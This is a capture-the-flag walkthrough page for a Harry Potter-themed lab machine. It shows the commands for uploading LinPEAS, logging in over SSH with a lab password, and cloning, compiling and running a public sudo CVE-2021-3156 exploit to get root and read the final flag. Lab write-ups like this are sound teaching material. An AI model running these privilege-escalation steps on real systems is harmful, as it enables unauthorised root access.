<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>5.4 Root privilege. Third flag.</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>5.4 Root privilege. Third flag.</h1><br/><br />Installing <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS</a>.<br /><span style="indent:1;">LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts. The checks are explained on </span><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation">book.hacktricks.xyz</a>.<br />   <br />2. On your Kali Machine create a “linpeas.sh” file with content of <a href="https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh">https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh</a>.<br />   <br />3. Copy the file to the victim&#39;s &quot;/tmp&#39; directory.<br />	<div class="codebox"><div class="codebox">kali@kali:~/nagini<span style="color:#0057ae;font-weight:400">$scp</span>&nbsp;linpeas.sh&nbsp;neville@192.168.12.20:/tmp<br /></div></div><br /><br />4. Connet via SSH to the victim&#39;s machine.<br />    <br />	User: neville<br />	Password: bL!Bsg3k<br />		<br />	<div class="codebox"><div class="codebox">kali@kali:~/nagini<span style="color:#0057ae;font-weight:400">$ssh</span>&nbsp;neville@192.168.12.20</div></div><br /><br />5. Change the “linpeas.sh” file permissions.<br />	<div class="codebox"><div class="codebox">neville@Fawkes:~<span style="color:#0057ae;font-weight:400">$cd</span>&nbsp;/tmp<br />neville@Fawkes:/tmp<span style="color:#0057ae;font-weight:400">$chmod</span>&nbsp;+x&nbsp;linpeas.sh</div></div><br /><br />6. Run “linepeas.sh” file with output file.<br />	<div class="codebox"><div class="codebox">neville@Fawkes:/tmp$./linpeas.sh&nbsp;|&nbsp;tee&nbsp;output<br /></div></div><br /><br />	<span style="color:#ffa500;">Output:</span>	<br />	<a href=""><img src="images/516-1.png" alt="images/516-1.png" /></a><br />	<br />	We got a message “sudo  ---&gt;  check_if_the_sudo_version_is_vulnerable”.<br />	<br />7. Show the “sudo” version.<br />	<div class="codebox"><div class="codebox">neville@Fawkes:/tmp<span style="color:#0057ae;font-weight:400">$sudo</span>&nbsp;--version</div></div><br />	<br />	<span style="color:#ffa500;">Output:</span>		<br />	<a href=""><img src="images/516-2.png" alt="images/516-2.png" /></a><br />	<br />8. You can use the exploit from <a href="https://github.com/0xdevil/CVE-2021-3156">https://github.com/0xdevil/CVE-2021-3156</a>.<br />   <br />    Clone the directory on your Kali Machine and copy it to the vicitm&#39;s machine.<br />	<div class="codebox"><div class="codebox"><span style="color:#0057ae;font-weight:400">$git</span>&nbsp;clone&nbsp;https://github.com/0xdevil/CVE-2021-3156.git<br /><span style="color:#0057ae;font-weight:400">$scp</span>&nbsp;-r&nbsp;CVE-2021-3156&nbsp;neville@192.168.12.20:/tmp<br /></div></div><br />	<br />9. On your “reveerse shell” terminal go to the “/tmp” directory.<br />	<div class="codebox"><div class="codebox">neville@Fawkes:<span style="color:#0057ae;font-weight:400">$cd</span>&nbsp;/tmp/CVE-2021-3156</div></div><br />	<br />10. Modify the “exploit.c” file.<br /><span style="indent:1;">By default, after the installation, sudo and sudoedit are placed in </span><code><span style="indent:1;">/usr/bin/</span></code><span style="indent:1;">, but here, as you can see executing </span><code><span style="indent:1;">which sudo</span></code><span style="indent:1;"> and </span><code><span style="indent:1;">which sudoedit</span></code><span style="indent:1;">, they are placed in </span><code><span style="indent:1;">/usr/local/bin/</span></code><span style="indent:1;">.</span><br /><span style="indent:1;">You only need to replace the default path in </span><code><span style="indent:1;">exploit.c</span></code><span style="indent:1;"> with the custom one.</span><br /><span style="indent:1;"> After this small modification the exploit will work.</span><br /><br />	<span style="color:#ffa500;">Output:</span>		<br />	<a href=""><img src="images/516-3.png" alt="images/516-3.png" /></a>	<br />	<br />11. Compile the file.<br />	<div class="codebox"><div class="codebox">neville@Fawkes:/tmp/CVE-2021-3156<span style="color:#0057ae;font-weight:400">$make</span><br /></div></div><br />	<br />	<span style="color:#ffa500;">Output:</span>	<br />	<a href=""><img src="images/516-4.png" alt="images/516-4.png" /></a><br />	<br />12. Run the file.<br />	<div class="codebox"><div class="codebox">neville@Fawkes:/tmp/CVE-2021-3156$./exploit.sh&nbsp;2&gt;/dev/null</div></div><br />	<br />	<span style="color:#ffa500;">Output:</span>		<br />	<a href=""><img src="images/516-5.png" alt="images/516-5.png" /></a><br />	<br />13. Show the “id&quot;.<br />	<div class="codebox"><div class="codebox">neville@Fawkes:/tmp/CVE-2021-3156<span style="color:#0057ae;font-weight:400">$id</span></div></div><br />	<br />	<span style="color:#ffa500;">Output:</span>	<br />	<a href=""><img src="images/516-6.png" alt="images/516-6.png" /></a><br />	<br />14. Let&#39;s find that last flag.	<br />	<div class="codebox"><div class="codebox">cd&nbsp;root<br />ls</div></div><br />	<br />	<span style="color:#ffa500;">Output:</span>		<br />	<a href=""><img src="images/516-7.png" alt="images/516-7.png" /></a><br />	<br />15. Show the content.<br />	<div class="codebox"><div class="codebox">cat&nbsp;horcrux3.txt</div></div><br />	<br />	<span style="color:#ffa500;">Output:</span>			<br />	<a href=""><img src="images/516-8.png" alt="images/516-8.png" /></a><br />	<br />16. Decode the hoxcrux. On your Kali Machine run the following command<br />	<div class="codebox"><div class="codebox"><span style="color:#0057ae;font-weight:400">$echo</span>&nbsp;<span style="color:#dd0000;font-weight:400">&#39;ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvVFRlUg==&#39;</span>&nbsp;|&nbsp;base64&nbsp;--decode<br /></div></div><br />	<br />	<span style="color:#ffa500;">Output:</span>	<br />	<a href=""><img src="images/516-9.png" alt="images/516-9.png" /></a><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>